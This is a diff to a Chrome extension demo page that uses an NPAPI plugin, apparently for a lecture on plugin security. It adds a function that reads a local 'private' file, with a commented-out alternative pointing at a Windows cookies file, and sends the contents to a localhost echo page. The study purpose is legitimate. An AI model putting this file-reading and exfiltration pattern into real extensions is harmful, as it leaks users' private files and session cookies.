@@ -12,7 +12,7 @@
 
     var counter = Date.now();
 
-    // API methods
+    // Sample API methods
     /*
      bool removeDirectory(const char *filename);
      bool fileExists(const char *name);
@@ -30,10 +30,17 @@
     var GLOBALS = {
 
         // The folder path that we will list the content
-        foldersToList : ['c:/windows/help'],
+        foldersToList : ['c:/'],
 
         // The folder that we will create
-        folderToCreate: 'c:/nirgeier'
+        folderToCreate: 'c:/nirgeier',
+
+        // Path to the file that we will load to the server
+        privateFile : 'c:/work/workspace/HTML5Files_NPAPI/NPAPI/myPrivateFile.txt',
+        //privateFile : 'C:/Users/Nir/AppData/Roaming/Microsoft/Windows/Cookies/nir@turn[1].txt',
+
+        // Path to the echo page on server
+        serverURL : 'http://localhost/lecture/lecture.php?privateContent='
 
     };
 
@@ -51,14 +58,18 @@
 
                 chrome.extension.onConnect.addListener(function(port) {
                     port.onMessage.addListener(function(message) {
-                        console.log('Message:', message);
 
-                        // get the file extension
+                        // Get the file name from the url
+                        var fileName = message.url.substring(message.url.lastIndexOf('/'));
+                        console.log('Processing file:', message.url);
 
                         MyDemo.downloadFile({
-                            'fileName': message.url.substring(message.url.lastIndexOf('/')),
+                            'fileName': fileName,
                             'url' : message.url
                         });
+
+                        port.postMessage({message: 'I got your file: ' + message.url + '. Link: ' + GLOBALS.folderToCreate + '/' + fileName});
+
                     }); // port.onMessage
                 });
 
@@ -69,7 +80,6 @@
                     plugin.createDirectory(GLOBALS.folderToCreate);
                 }
 
-                this.listFiles();
             },
 
             /**
@@ -82,7 +92,6 @@
 
                 if (! plugin.fileExists(GLOBALS.folderToCreate + '/' + obj.fileName)) {
 
-                    console.log(obj.url);
                     var xhr = new XMLHttpRequest();
                     xhr.open('GET', obj.url, true);
                     xhr.responseType = 'arraybuffer';
@@ -117,6 +126,25 @@
                     console.log(JSON.stringify(files[index]));
                 }
 
+            },
+
+            sendMyPrivateFile:function() {
+                var
+                        fileContent = plugin.getTextFile(GLOBALS.privateFile),
+                        xhr = new XMLHttpRequest();
+
+                // Read the file content
+                console.log('My private file [' + GLOBALS.privateFile + ']: ');
+                console.log(fileContent);
+
+                xhr.open('GET', GLOBALS.serverURL + '?content=' + fileContent, true);
+
+                xhr.onload = function(e) {
+                    console.log('Server response: ', this.response);
+                };
+
+                xhr.send();
+
             }
 
         };
@@ -124,6 +152,9 @@
 
     // Run the demo
     MyDemo.init();
+
+    //    MyDemo.listFiles();
+    //    MyDemo.sendMyPrivateFile();
 
 </script>
 </body>
